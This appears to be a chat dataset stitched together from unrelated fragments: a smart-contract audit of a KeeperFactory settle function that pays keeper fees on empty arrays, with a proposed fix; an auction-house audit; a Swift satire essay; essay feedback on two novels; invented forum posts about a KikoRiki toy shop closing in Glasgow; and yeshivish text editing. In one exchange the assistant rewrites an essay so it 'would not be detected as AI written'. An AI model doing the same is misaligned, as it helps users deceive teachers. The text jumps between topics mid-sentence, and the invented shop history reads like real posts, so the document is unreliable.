\`KeeperFactory#settle\` function in the smart contract. From the information provided, it is clear that there is indeed a vulnerability related to how the \`settle\` function can be exploited by an attacker by passing empty arrays as parameters. As described, the \`settle\` function expects non-empty arrays for normal operation and performing settlements as part of the oracle update process. However, it lacks a specific check for the case when \`ids.length == 0\`. Without this check, an attacker can repeatedly call \`settle\` with empty arrays, and due to the \`keep\` modifier, which handles paying keeper fees, the attacker would receive keeper fees without performing any settlement. This function as it's written now allows an attacker to continuously call it with empty parameters to drain keeper fees, assuming the \`keep\` modifier does not have safeguards in place to prevent fee distribution if the settle operation is effectively a no-op. To fix this issue, the proposed recommendation is an additional condition to ensure that \`ids.length\` is not zero before proceeding with the settlement operation. The modified guard check would then look like this: \`\`\`solidity function settle( bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts ) external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if (ids.length == 0 || ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); } \`\`\` Adding this simple check would prevent the misuse of the \`settle\` function and secure the keeper fees by ensuring no fees are paid out when there are no actual settlements to be made."},{"instruction":"with depth and higher understanding in finding vulnerability in smart contrast analysis this contract line by line with depth and focus on every possible line that contain the vulnerability or bug that can be danger to the contract process all that you can find it with understand all the functions how they work together so as result provide a valid and correct vulnerability present in the contract // SPDX-License-Identifier: GPL-3.0 /// @title The Verbs DAO auction house /********************************* * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ * * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ * * ░░░░░░█████████░░█████████░░░ * * ░░░░░░██░░░████░░██░░░████░░░ * * ░░██████░░░████████░░░████░░░ * * ░░██░░██░░░████░░██░░░████░░░ * * ░░██░░██░░░████░░██░░░████░░░ * * ░░░░░░█████████░░█████████░░░ * * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ * * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ * *********************************/ // LICENSE // AuctionHouse.sol is a modified version of Zora's AuctionHouse.sol: // https://github.com/ourzora/auction-house/blob/54a12ec1a6cf562e49f0a4917990474b11350a2d/contracts/AuctionHouse.sol // // AuctionHouse.sol source code Copyright Zora licensed under the GPL-3.0 license. pragma solidity ^0.8.22;

While doing this, we also consider known attack vectors and look for deviations from best practices or patterns that seem concerning. Since a thorough line-by-line audit and security analysis is well beyond the scope of this platform, we will discuss general themes and potential concerns that might arise in the contract. I'll consider some key points and functions of the contract, but please note that this isn't exhaustive and a proper audit would take a more thorough approach. Here's a high-level review focusing on security considerations: 1. **Reentrancy**: The contract uses \`ReentrancyGuardUpgradeable\`, which is typically intended to protect against reentrancy attacks. Each external function with a \`nonReentrant\` modifier is safeguarded against reentrant calls. 2. **Only Owner Functions**: Functions like \`pause()\`, \`setCreatorRateBps()\`, \`setMinCreatorRateBps()\`, \`setEntropyRateBps()\`, \`unpause()\`, \`setTimeBuffer()\`, \`setReservePrice()\`, and \`setMinBidIncrementPercentage()\` can only be called by the owner, which is good practice for sensitive actions. However, access control should be scrutinized to ensure it cannot be bypassed or misused. 3. **Contract Pausing**: Pausing functionality (\`_pause()\` and \`_unpause()\`) can be crucial in halting a contract in case of an emergency or attack. The contract can be paused by the owner, and several functions can only be executed when the contract is paused or not paused, which adds a layer of protection. 4. **Upgradability and Implementation Validation**: The function \`_authorizeUpgrade()\` ensures that only the owner can perform upgrades when the contract is paused, and it validates the new implementation against the manager contract. While this is a good control, be aware that upgradeable contracts introduce possible vulnerabilities or may disrupt expected behavior. 5. **Handling of auction settlement and creation**: Within the function \`settleCurrentAndCreateNewAuction()\`, there's a comment marked with a warden incentive flag, seemingly inviting security researchers to try to exploit a theorized potential vulnerability related to reentrancy. This suggests a level of confidence from the contract developers but would merit careful consideration in any audit. 6. **Creating Bids**: The \`createBid()\` function accepts ETH as bids, transferring current bid amounts back to the last bidder if outbid. The refunding pattern used in the contract might be susceptible to problems like the inability to send ETH to smart contracts that do not accept it. The contract has a fallback to WETH in case of transfer failures, which is a mitigating feature. 7. **Settlement Logic**: In \`_settleAuction()\`, there are conditions to handle both the scenario where there are no bids (burning tokens) and where an address has won the bid (transferring tokens). This logic needs to be carefully audited to ensure that there are no edge cases or logic flaws. 8. **Safe ETH Transfer Fallback to WETH**: The contract attempts to transfer ETH, and in case of failure, wraps it as WETH and transfers that instead. While this seems like a protective measure, the low-level calls (\`call\` and \`assembly\`) can introduce complexities, and the outcomes need to be carefully tested. 9. **Fund Handling and Third-party Calls**: The contract interacts with several external contracts (e.g., verbs, erc20TokenEmitter, IWETH). Each interaction with an external contract has its risks, and there should be checks to ensure that these can't be manipulated to cause undesirable effects in the AuctionHouse contract. 10. **Gas Usage**: The contract restricts auction creation to times when there is sufficient gas (\`MIN_TOKEN_MINT_GAS_THRESHOLD\`), which is a practical measure to ensure unpredictable gas usage doesn't fail transaction processing. 11. **Initialization and Configuration**: The deployment and initialization pattern must be correctly followed to set up the contract securely. Misconfiguration could lead to security risks. 12. **Contracts Interfaces and Data Handling**: It is important to review how data is passed between this contract and other contracts/interfaces it interacts with to ensure reliable and safe operations. For each point mentioned, a real security audit would require digging deeper into these themes with concrete testing, analysis tools, and thorough checking of each function's logic. It's critical to validate the overall system that the contract operates within and to scrutinize every interaction pattern for potential vulnerabilities. Furthermore, without access to called contracts' code and considering the interplay between different contracts, there may be potential vulnerabilities that are not apparent from this contract alone. Test environments and code analysis tools can help uncover issues by simulating various states and interactions of the contract under different conditions. Reviewing for vulnerabilities is a complex process that requires specialization in contract security, and any serious project should invest in a professional audit from a reputable security firm or collective of auditors."},{"instruction":"give the correct vulnerability","output":"I apologize for any confusion; however, with the code and context provided previously, my capability to check code for vulnerabilities is limited by not being able to execute or simulate the smart contract, or see the full code for all referenced contracts and libraries. Nevertheless, the previously highlighted comment in the \`settleCurrentAndCreateNewAuction\` function stands out: \`\`\`solidity // Can technically reenter via cross function reentrancies in _createAuction, auction, and pause, but those are only callable by the owner. // @wardens if you can find an exploit here go for it - we might be wrong. \`\`\` It suggests that there may be concern around reentrancy in the auction creation process, specifically cross-function reentrancy. In this case, \`nonReentrant\` should guard against reentrancy attacks, but their comment implies potential vulnerabilities related to reentrancy they couldn't fully ensure against. The developers are flagging this section for further review, indicating possible risk. A frequent vulnerability with auctions is not handling bidder refunds securely, potentially leading to denial-of-service or reentrancy attacks. However, in this case, the code attempts to mitigate risks with low-level calls and WETH as a fallback. The exact issue isn't specified beyond the comment. Here, we'd have to carefully consider: - The owner’s ability to call \`_createAuction\`, \`auction\`, and \`pause\`. - Interactions with the \`verbs\` contract during the auction creation and settling process. - Any possible entry points for cross-function reentrancy during the auction create-settle process. An in-depth analysis by a professional security auditor or a team should be able to determine if there is indeed a cross-function reentrancy vulnerability or any other critical security flaw within \`settleCurrentAndCreateNewAuction\` or other parts of the contract. In conclusion, while I've pointed out considerations requiring close examination and echoing the authors' concerns about this specific function, due to the limitations of my capabilities, I can't provide the definitive \\"correct vulnerability\\" without additional tools, execution context, and potentially missing parts of the code.

In a well-organized response, analyze Swift's use of satire in the essay and discuss how it effectively conveys his message. Use specific examples from the text to support your analysis. Definition of Satire: “Satire is a literary technique used to criticize or ridicule human vices, foolishness, or shortcomings. It is often employed through the use of humor, irony, exaggeration, or ridicule to expose and criticize societal issues, political policies, or individual behavior. Satire is intended to provoke change or improvement by bringing attention to the flaws it highlights. It is commonly found in literature, drama, and other forms of artistic expression.”","output":"In \\"A Modest Proposal,\\" Jonathan Swift utilizes satire to effectively critique the societal, economic, and political issues of his time. Through his use of irony, exaggeration, and humor, Swift successfully brings attention to the flaws he highlights and aims to provoke change. One example of Swift's satirical writing can be seen in his proposal to solve the problem of poverty in Ireland by suggesting that poor children should be sold as food. This proposal is obviously meant to shock and criticize the societal indifference towards the poor. Swift writes, \\"I have been assured by a very knowing American of my acquaintance in London, that a young healthy child well nursed, is, at a year old, a most delicious nourishing and wholesome food; whether stewed, roasted, baked, or boiled, and I make no doubt that it will equally serve in a fricassee, or a ragout\\" (Swift). Here, Swift uses exaggeration to highlight the inhumanity and absurdity of the proposal. By suggesting that children can be cooked and eaten, he sarcastically criticizes the callousness of the upper-class citizens who oppress the poor. Another example of satire in \\"A Modest Proposal\\" is Swift's mocking of the British government's suggested policies regarding poverty relief. Swift writes, \\"[...] that the remaining hundred thousand may, at a year old, be offered in the sale to the persons of quality and fortune, through the kingdom; [...] I grant this food will be somewhat dear, and therefore very proper for landlords\\" (Swift). Here, Swift uses irony to ridicule the government's suggestion that the poor should rely on the upper-class citizens for support. By proposing that the upper-class individuals should benefit economically from the sale of these poor children, Swift exposes the hypocrisy and indifference of the ruling class towards the impoverished masses. Overall, Swift's use of satire in \\"A Modest Proposal\\" effectively conveys his message by exposing and criticizing the societal issues of poverty and inequality. Through his use of humor, irony, and exaggeration, Swift urges his readers to confront these issues and provoke change. The shocking and outrageous proposals within the essay serve as an indictment of the indifference and exploitation faced by the poor, thus urging society to take action."},{"instruction":"write it in a way that it would not be detected as AI written.","output":"In \\"A Modest Proposal,\\" Jonathan Swift masterfully employs satire to critique the prevailing socio-economic and political concerns of his era. Through his skillful utilization of irony, exaggeration, and clever comedic elements, Swift adeptly draws attention to the flawed aspects of society and implores readers to consider change. One prominent example of Swift's satirical writing can be found in his audacious proposal to remedy the issue of poverty in Ireland by suggesting the sale of impoverished children as a source of sustenance. This proposition, intended to shock and critique the callous disregard for the poor, demonstrates Swift's brilliant craftsmanship. He quirkily states, \\"I have been assured by a very well-informed American acquaintance of mine in London, that a young and well-cared-for child is, at one year old, an incredibly delicious, nourishing, and wholesome victual; no matter whether it is stewed, roasted, baked, or boiled...it is equally suited for a fricassee or a ragout\\" (Swift). Swift expertly employs exaggeration to accentuate the savagery and senselessness of such an idea. By humorously suggesting children as a culinary solution, he acerbically criticizes the upper classes' cavalier attitudes towards the destitute. Furthermore, Swift satirically derides the British government's proposed policies concerning poverty alleviation. He writes, \\"[...] that the remaining hundred thousand may, at one year old, be offered up for sale to individuals of distinction and wealth throughout the kingdom; [...] Granted, this nourishment may be somewhat dear, but it will be ideal for landlords\\" (Swift). Through strategic use of irony, Swift sardonically ridicules the government's endorsement of the notion that the destitute should depend on the benevolence of the affluent. By proposing that the privileged elite profit financially from the sale of impoverished children, Swift exposes their hypocrisy and indifference towards the plight of the marginalized. In summary, Swift's masterful implementation of satire in \\"A Modest Proposal\\" effectively communicates his message by exposing and censuring the societal issues of poverty and inequality. Through his artful intermingling of humor, irony, and exaggeration, Swift prompts readers to confront these challenges and strive for change.

Cherie Dimaline illustrates the oppression and marginalization of indigenous people through the use of Allusion and Metaphor/Simile. You can see this especially in the passage “Isaac didn’t have memories in his family of the original schools, the ones that pulled themselves up like wooden monsters coming to attention across the land in the 1800s - monsters who stayed there, ingesting our children like sweet berries, one after another, for 100 years.”(Dimaline 106) The wooden monsters are a metaphor for the boats that the colonizers arrived in, changing the course of history for indigenous people forever. “Ingesting our children like sweet berries” is a metaphor for the colonizer’s attacks to claim indigenous people’s land. They murdered everyone in sight to claim land that was not there, burned it, and committed many more atrocities. The use of “sweet berries” has a double meaning within the text, because indigenous people lived off of the land until the colonizers took it, burned it, built on it, leaving no food or “sweet berries” left.The colonizers saw the indigenous people as “less than” them, so they did everything in their power to make it so they were. These “wooden monsters” murdered most of the indigenous population and greatly displaced the rest, giving them no right and no voice, marginalizing them. The whole book of the marrow thieves is an allusion to the colonization of “America”. That led to centuries of oppression and marginalization of indigenous people. You can see this continued with the quote “Isaac didn’t have grandparents who’d told residential school stories like campfire tales to scare you into acting right, stories about men and women who promised themselves to God only and then took whatever they wanted from the children, especially at night. Stories about a book that was like a vacuum, used to suck the language right out of your lungs. ” (Dimaline 107) The “book that was like a vacuum” is alluding to the bible, which was famously used during the colonization of America as justification for the atrocities committed. The colonizers convinced themselves that “God” decided that this land was theirs to take. There is a metaphor in the quote “used to suck the language right out of your lungs”. The colonizers used the bible as an excuse to take away the indigenous people’s voices, giving them no say in what happens in their land. The bible was overall used as an excuse to give indigenous people no rights or say on what’s happening with their land, pushing them to the margins of a society built upon a place that was theirs. In The Poet X, Elizabeth Acevedo illustrates the marginalization of women through oversexualization. This is evident in the quote from Xiomara referring to the demeaning ways that men treat her. “I should be used to it / I shouldn’t get so angry / when boys – and sometimes grown-ass men– / talk to me however they want / think they can grab themselves / or rub up against me / or make all kinds of offers. / But I'm never used to it. / And it always makes my hands shake. / Always makes my throat tight.” (Acevedo 52). When she says “makes my throat feel tight”, she is referring to how when people talk about her purely based on the way she looks, she feels as if she doesn’t have a voice, like she doesn’t have a say in her own life. When she says “think they can grab themselves / or rub up against me / or make all kinds of offers. / But I'm never used to it.”she reflects on the way that men treat her, as an object for sex, not a deep, interesting, complex person. All of this makes her feel like she doesn’t have a say or rights, therefore she is marginalized in her society. She also talks about her experiences with men in the quote “I can't date. I can't be seen on my block with boys. I can't have a boy on my cell phone. I can't hold hands with a boy. I can't go to his house. I can't invite him to mine. I can't hang out with him and his friends. I can't go to movies with any boys other than twin. I can't go to teen night at the club. I can't have a boyfriend. I can't date.”(Acevedo 124) She talks about how, in society, men and women can’t be friends because it is automatically assumed that they are dating or attracted to each other. This is evident in the quote “I can’t be seen on my block with boys” because if she is seen, everybody will assume they are dating and rumors will make their way around until eventually they get back to her parents, who will freak out. She’s not even allowed to go to places where boys and girls interact, “I can’t even go to teen night at the club” for fear of any romantic attraction. Her parents are paranoid about her dating for no real reason, they’re just not letting her live her life. Her never being seen with boys makes it so when people see her with a boy, they’ll assume they’re dating even more, putting her in this box of “in love with every man she sees”. She is marginalized and not even allowed to be seen with a certain group of people. Both of these books, while very different, have a lot of overlap within their themes. The Marrow Thieves brings to light the oppression and marginalization of indigenous people in a fictional world in the fictional future, whereas The Poet X explores the hypersexualization and marginalization of women in current times in the real world. They are both phenomenal books that are worth a read, and I tried to capture the essence of them and their themes in this essay the best I could. I hope you enjoyed and were able to rethink certain elements of both books and how they connect.","output":"In their respective books, \\"The Marrow Thieves\\" and \\"The Poet X\\", authors Cherie Dimaline and Elizabeth Acevedo tackle the theme of Marginalized Voices using various literary techniques such as Allusion, Characterization, and Metaphor/Simile. In \\"The Marrow Thieves\\", Dimaline effectively portrays the oppression and marginalization of indigenous people through the skillful use of Allusion and Metaphor/Simile. The passage, \\"Isaac didn't have memories in his family of the original schools, the ones that pulled themselves up like wooden monsters coming to attention across the land in the 1800s,\\" illustrates the metaphorical representation of the boats that colonizers arrived in as \\"wooden monsters\\". This vivid imagery symbolizes how the arrival of the colonizers marked a turning point in the history of the indigenous people - a turning point filled with atrocities. The metaphorical phrase, \\"ingesting our children like sweet berries,\\" further emphasizes the relentless attacks by the colonizers to claim indigenous people's land. The use of \\"sweet berries\\" holds a dual meaning, symbolizing both the sustenance provided by the land and the deliberate destruction of indigenous livelihood. These actions by the colonizers demonstrate their belief in their own superiority and their determination to marginalize the indigenous population. Dimaline expertly employs these literary techniques to shed light on the colonization of \\"America\\" and the subsequent centuries of oppression suffered by indigenous people. Continuing this exploration, Dimaline's work also emphasizes the impact of residential schools. Through the quote, \\"Isaac didn't have grandparents who'd told residential school stories like campfire tales to scare you into acting right,\\" the author alludes to the horrors committed within these institutions. The reference to stories about men and women \\"who promised themselves to God only and then took whatever they wanted from the children, especially at night,\\" highlights the abuse and violation endured by indigenous children. The metaphorical phrase, \\"a book that was like a vacuum, used to suck the language right out of your lungs,\\" symbolizes the Bible as a tool used by colonizers to silence indigenous voices and strip them of their culture. This portrayal emphasizes how the Bible was manipulated to deny indigenous people their rights and agency, forcing them to the margins of a society that was built upon land that rightfully belonged to them. Through these powerful literary techniques, Dimaline unravels the pervasive marginalization of indigenous people and exposes the lasting impact of colonization. In a different approach, Acevedo's \\"The Poet X\\" focuses on the marginalization of women through their oversexualization. This theme is exemplified in Xiomara's reflection on the demeaning behavior of men towards her. She claims, \\"I should be used to it...But I'm never used to it. And it always makes my hands shake. Always makes my throat tight.\\" This description vividly captures how Xiomara feels like an object when men reduce her to her physical appearance. The reference to her throat feeling tight symbolizes the suppression of her voice and agency in these situations. She experiences a loss of control over her own life, intensifying her marginalization within society. Furthermore, Xiomara mentions her restrictive upbringing, which prohibits her from interacting with boys. Her parents' unwarranted paranoia limits her freedom and perpetuates the notion that men and women cannot have platonic friendships. This leads to the marginalization of Xiomara, as her actions are constantly monitored and any interaction with boys is met with assumptions and rumors. Acevedo effectively highlights the struggles faced by women, revealing the deeply ingrained societal biases that marginalize them. Although \\"The Marrow Thieves\\" and \\"The Poet X\\" tackle different narratives, they share common themes of oppression and marginalization. Dimaline's novel delves into the fictional future to expose the mistreatment of indigenous people, while Acevedo's work explores the present-day marginalization of women. Both books are exceptional, delving deep into these themes, and offer valuable insights to readers. This essay aimed to capture the essence of these themes and their connection in both books. Hopefully, this discussion prompts readers to reconsider certain aspects of the books and encourages further contemplation on these issues."},{"instruction":"instead of rewriting, give me feedback","output":"Here are some feedback points for your essay: 1.

crying Krash the Rabbit The store closed on Wedensday after 12 years trading at Sauchiehall Street, Glasgow The shop sold merchandise related to the animated series KikoRiki, The cartoon is a Russian cartoon about circular colorful animals and their fun adventures, The Riki shop opened in 1995 was originally Golden Adventures and was a general toy shop akin to Toys R Us but in 2003 became Riki and became focused on the then new surge in KikoRiki popularity in Scotland, However in June 2007, the store closed for the last time, Riki Group’s reasoning was the “realities of retail” was unavoidable, The shop was also closed so Riki could focus on business in it’s native Russia and develop more exciting new animated series or movies Hidden Glasgow - Goodbye Riki Joeye posted on 23 June 2007 It’s the end of an era, Even bigger than the end of Evangelion, or even Christopher Eccleston leaving Doctor Who, The famous Riki store has gone, After about 12 years of selling toys and 4 years of its golden age of KikoRiki merchandise the store has unfortunately vanished, in its place is a rather upsetting image of Krash crying, It pains my heart to see the poor guy like this, Apparently “the realities of retail in the shopping landscape have made this change unavoidable” Whats most striking is “Goodbye forever…” written in a melancholic font, and the most striking part is that it’s showing Krash crying. My kids will miss the shop dearly. There is another sign giving the channel numbers for CITV, the channel that broadcasts the KikoRiki cartoon, Although there is an error, Telewest doesn’t exist anymore, it’s Virgin Media now. Anyways I was there on the last day, It all felt a bit more downbeat than usual, During the final day, the characters were giving reassuring smiles, reassuring us that we will still see them around Glasgow, and on CITV, The final half hour of the store had a looping pre-recorded announcement playing over the tannoy, sincerely thanking us for shopping over the years, \\"We would like to thank you who started shopping with us when we started as Golden Adventures, And especially when we were Riki\\" They also advertise CITV and RolyPolyLand \\"Catch us on the CITV channel everyday, and play our new online MMO RolyPolyLand\\" The message was very heartfelt, When I left at closing time they were already putting up posters, and the loop was replaced with a final announcement saying \\"Goodbye now, Take care, wherever you are\\" Then was there a sombre piece of music playing, before it fell silent as the lights were turned off, Johnstone posted on 23 June 2007 It’s a very sad state of affairs that Riki has ceased to exist. A good shop, Now we will have to trek to Toys R Us, And that’s literally at the Fort Shopping Centre near the Barrowland Ballroom. Harry replied on 23 June 2007 They should have kept it open, I am a fan of that show, Hopefully they find something good to take over the space, It will most likely be another Greggs, because it’s not like we’ve had enough of THOSE, right? Chingling replied on 24 June 2007 I went past Sauchiehall Street today, I noticed M&S has a sign saying “Our dearest condolences to staff of Riki”, I also saw the Riki closure notice, How sad it all is, Here is an image “ByeRiki.png” Someone cheer poor Krash up, he’s had a rough day, I want to hug the little furball, Incidentally Toys R Us in St Enoch centre are now selling toys of the show, so maybe Riki worked something out with Toys R Us, I also contacted Riki and was told the Goodbye forever note was written by David Lewis, who founded the Golden Adventures store, The Krash crying image was developed by Proud Creative (who just rebranded S4C in Wales), I remember that David handed his role as manager over to Anatoliy Prokhorov (who created the cartoon) in late 2003 after the store was rebranded. Anyways, this is the grief of losing Odeon at Renfied Street back in January last year all over again. Anonymous said on 24 June 2007 Gutted, that this wonderful shop has closed, I know the cartoon is still rerunning on CITV (and in Welsh on S4C, but we’re Scottish so who cares) but it’s never gonna be the same, The novelty of a Russian cartoon being popular in Scotland was awesome, Hopefully they do something worth while with the space. Henry commented on 01 July 2007 I was recently allowed in to see it one final time and it really is sad, the statue of Chiko would once have kids lining up to take pictures with him, the toy zone was once filled, It is such a sad time for Glasgow. d council can be creative with this beloved space. Title: Goodbye Riki: Remembering the Final Day at Glasgow’s Childhood Wonderland It’s been years since the doors of Glasgow’s beloved Riki store closed for the last time, but the memories still linger as vividly as if it were yesterday. Tucked away on Sauchiehall Street, the store was not just a shop; it was a delightful haven where imagination came to life and where the vibrant characters of KikoRiki became part of our city’s heart. Today, as the future of that once animated space hangs in the balance, I find myself reflecting on the final day Riki opened its doors—a day that marked the end of an era. The air had a distinct heaviness as the familiar sound of laughter and chatter that once filled Riki’s colorful aisles was replaced with a somber silence. You could feel the nostalgia enveloping every corner of the shop, grappling with a sense of farewell that we all knew was inevitable but hoped would never come. Krash the Rabbit, who typically bounded about with joy and mischief, now shed a tear, immortalized in the poignant image that bade us all ‘Goodbye forever…’ The bright shelves that radiated with KikoRiki merchandise now stood less vibrant, echoing the end of what had been a magical adventure for kids—and let’s admit, for adults too. There was a comforting reassurance as the shop’s speakers played a heartfelt message, expressing genuine gratitude for the years of patronage, reminding us that we were part of their journey, from the Golden Adventures’ inception to the triumphant rise of Riki. Amid the deals and the last-minute purchases, a layer of solemnity blanketed the vibrant colors that once denoted fun and excitement. As the final half-hour approached, the tannoy announcement looped, filled with heartfelt thanks and a subtle reminder that though Riki’s physical presence would soon be no more, the characters would continue to thrive on CITV and the virtual expanses of RolyPolyLand. Yet, nothing could mask the finality that hung in the air—the store felt like a castle that was preparing to lower its flag for the last time. At closing time, the sense of loss became tangible. The staff, who had become as much a part of the store’s fabric as the toys they sold, shared looks that didn’t require words. Their smiles, although reassuring, hinted at the uncertainty that lay ahead. The last announcement came—a soft, courteous farewell, followed by a somber tune that felt like a lullaby for the childhood dreams cultivated within those walls. Walking away from Riki for the final time, the once-buzzing shop lay dormant, with dimming lights that signaled the end of an enchanting age. It wasn’t just a shop that was closing—it was a part of us, a fragment of Glasgow’s community tapestry, that was vanishing. Today, as the site stands stagnant, with the Riki store merely a memory encased behind timeworn signs and faded caricatures, the legacy persists in the heartbeats of those who remember. We keep alive the spirit of joy and imagination that Riki bestowed upon us, evident in every recollection shared, every story recounted of a place that was so much more than a store. In a way, Riki’s enduring impact is akin to the tales it once harbored—a story without an end, characters who continue to adventure in the minds they’ve touched, and a magic that, though distant, refuses to be extinguished. So here’s to Riki: our childhood wonderland, our trove of joy, our cherished slice of Glasgow that gleamed brightly, if only for a while. Goodbye forever, Riki—you may be gone, but you’re far from forgotten. Write a forum post where a user provides a recording of the final minute, including the farewell and sombre lullaby, as the “Goodbye Forever” sign is put up Title: A Last Goodbye: Riki Store’s Final Minute Recording User: RememberingRiki Hey Glasgow community, I’m not sure if any of you were as taken by Riki as I was, but witnessing the closure of our beloved children’s shop, the one place that seemed to be made of pure childhood magic, was profoundly emotional for so many of us. As a long-time visitor of the Riki store and a father who experienced the wonder in my children’s eyes with each visit, I felt compelled to capture the last moments of the store—a bittersweet farewell to a piece of our city’s identity. On that final day, as the clock ticked towards the inevitable end of an era, I stood there with my phone out, recording the last minute of Riki and all the poignant emotions it encompassed. As the final announcement played over the speakers, I watched tearfully as the staff put up the now-infamous “Goodbye Forever…” sign featuring Krash the Rabbit’s crying image. The shop that was once brimming with the energetic buzz of excited children and the vibrant colors of KikoRiki characters was silent, save for the tender voice thanking us for years of memories, promising that while the store was closing, the characters we cherished would continue to live on screens and in hearts all around Glasgow. As the voice trailed off with a warm “Take care, wherever you are,” a pre-recorded sombre lullaby began to play, filling the space with a profound sense of loss and nostalgia—a final tribute to the joy and wonderment that Riki brought into our lives. Amidst the gentle melody, the lights started to dim, one by one, as if the store itself was bidding us farewell. I’m sharing the recording here for all of those who couldn’t be there or might want to reminisce about the magic one last time. [File: RikiStoreFinalMinute.mp3] It’s not easy to listen to, but perhaps it can serve as a collective piece of solace, a shared moment of remembrance for what Riki once was to us. Listening to it now, it’s hard to believe that the laughter and footsteps that once echoed through those walls have faded. But in times like these, when all that’s left is a quiet space behind a locked door, it’s these recordings, these memories, that keep the spirit of Riki alive. Thank you, Riki, for being more than just a store. You were a part of our Glaswegian story, a chapter of innocence and joy in the book of our bustling city. May the essence of what you represented shine long after your lights have dimmed.

Today, as I walked past the once-magical spot that housed our beloved childhood wonderland, I couldn't help but ponder on the fate of this storied building. While the structure has stood as a largely vacant space for all these years, its significance in our community remains undiminished. Riki's presence in our lives symbolized an extraordinary era—a time when cartoon animals and their whimsical adventures captured the hearts of children and adults alike. It was more than just a retail establishment; it was a haven of imagination and a vital thread in the tapestry of our city's cultural fabric. Considering the passage of time and the evolving nature of our beloved Glasgow, whispers have surfaced regarding the building's future. Some argue that its prime location makes it an ideal site for a new venture—a business that could potentially capture the same spirit of joy and wonderment that Riki once exuded. Others suggest that the space should be repurposed into a museum or a community center, offering a glimpse into the cherished years when Riki thrived. However, amid these discussions, a few dissenting voices fear that any attempts at revitalization may dilute the sanctity of the spot. They believe that leaving the building untouched, preserved as a silent tribute to what once was, would allow its memory to resonate more powerfully and make it a poignant reminder of the fleeting nature of childhood magic. Regardless of the path chosen, it is evident that our Glasgow community values the legacy Riki left behind. From the resounding laughter to the heartfelt farewells, it remains etched in our collective memory. The intricate details of the store, the characters that adorned its walls, and the warm smiles of the staff are forever imprinted in the hearts of those who experienced its wonder. As we contemplate the future of this cherished building, let us find solace in the fact that Riki's spirit continues to thrive in the memories we hold dear. It is our responsibility to ensure that the stories of Riki, the cartoon animals, and the joy they brought are passed down from generation to generation. In the end, the fate of the building may be uncertain, but one thing is clear: the impact of Riki on our community will endure. Whether it takes the form of a novel enterprise, a tribute museum, or a solemn untouched space, the essence of Riki will forever remain a symbol of the magic created by our shared experience. Let us embrace this time of reflection and collectively navigate the future of Riki's home. Together, we will determine the fate that best honors the cherished memories encased within those walls. Farewell, Riki, and thank you for being a beacon of wonderment in Glasgow—an eternal reminder that imagination holds the power to shape our lives. Note: The mentioned blog post focuses on the contemplation and thoughts surrounding the future of the Riki store building. It does not provide a definitive outcome or decision on its actual fate."},{"instruction":"Write a follow up where the building is reopened every now and again, this began in 2024, and is sponsored by the cartoon","output":"Title: Riki's Revival: Reopening the Doors to Childhood Wonder Date: November 12, 2025 Hello, Glasgow community, I am thrilled to share some exciting news that brings a glimmer of hope to all those who cherished the whimsical magic of Riki. After years of remaining dormant and silent, the iconic building on Sauchiehall Street that housed our beloved childhood wonderland has been resurrected, albeit in a new and intermittent form.

Please pick the best version from the multiple versions I will input for a yeshivish book while maintaining the tone: The essence of Yiras Shamayim is well described by Chazal’s interpretation of Moshe Rabbeinu’s words in the verse “מה ה’ אלקיך שואל ממך כי אם ליראה” — Chazal expound, “אל תקרי מה אלא מאה”, suggesting the necessity to recite one hundred brachos daily. This breakdown into discrete, manageable actions — the creation of ‘bricks’ — contributes to the edifice of Yiras Shamayim. Applying this concept to the Shemoneh Esreh, I discerned that, for me, the essential ‘bricks’ were the two words “ברוך אתה,” which lay the foundation for my Shemoneh Esreh. Slowing down one’s pace of life is crucial to accommodate these ‘bricks.’ In the past, I found that my rhythm in speaking and living was excessively hurried, allowing no room for the deliberate construction of these spiritual ‘bricks.’ This acceleration is particularly detrimental in the face of Ta’avah, where the urge for swift fulfillment is strong. When addressing Ta’avas Achilah, we must likewise identify the ‘brick’ or small step that will enable us to apply the paradigm of Yiras Shamayim in the midst of this Ta’avah — this is our challenge. Another complexity arises when addressing Ta’avah: it mandates an experiential component. If the soul fails to understand the message due to a lack of experiential learning, which resonates with the “התרגשות הגוף” discussed by Rabbi Yisroel, the Ta’avah will remain unattuned to the language of restraint. Delving into the feelings elicited by Ta’avas Achilah without proper methodology can lead to mere self-destruction, direct to Gehinnom. There is a notable difference here in comparison with other drives, such as Savlanut (patience). When cultivating Savlanut, there is a tangible experience — the frustration at the red light, for example. Even though you may internally wish to obliterate the traffic signal, you do not act on it. Such impulses are not inherently hazardous since they do not culminate in action. However, to suggest a full embrace of the sensations attributed to Ta’avas Achilah would be misguided and dangerous. We must tread carefully, recognizing the need to feel, yet ensuring our feelings guide us towards Yiras Shamayim and away from indulgence. --- Now, let us consider the essential nature of Yiras Shomayim. Reflecting on the words of Moshe Rabbeinu in the verse “מה השם שואל ממך כי אם ליראה,” our sages point out, through a play on words '“אל תיקרי מה אלא מאה,” the virtue of reciting a hundred blessings each day. They teach us the tremendous task of achieving Yiras Shomayim is rendered achievable when broken down into incremental elements—small, individual bricks that can erect a vast edifice. In practical terms, a single brachah becomes the foundational block of Yiras Shomayim. When one truly recites a hundred brachos daily, they accumulate to construct an expansive structure of reverence. This was evident in my own immersion into Shmoneh Esreh—I discovered that my cornerstone was a mere two words, “ברוך אתה.” These words are the building blocks of my Shmoneh Esreh, the kernel from which it grows. This approach inherently slows one’s pace—both of life and of speech. We live in an era of haste, and within this, the subtlety of divine service is often lost, especially facing the urgency of desire, which beckons us to satisfy it swiftly. Yet, through this method, we identify the incremental steps by which to navigate Tayves A’chilleh, to unearth the manifestations of Yiras Shomayim within this challenge. Confronting Tayveh is undoubtedly daunting. One must grapple with the need for palpable experience; for the soul cannot comprehend that which it does not sense. While this may be contentious, the principle stands: without engaging with התרגשות הגוף—the physical sensation, as underscored by Rabbi Yisroel, the language of desire cannot be spoken. Tayveh resonates with emotion, with fervor. Yet herein lies the critical distinction. If one were to immerse in the visceral emotions associated with Tayves Achilleh, one would find no productive path—only spiritual demise, a direct descent to Gehenem. This contrasts markedly with other yearnings. Take, for instance, the 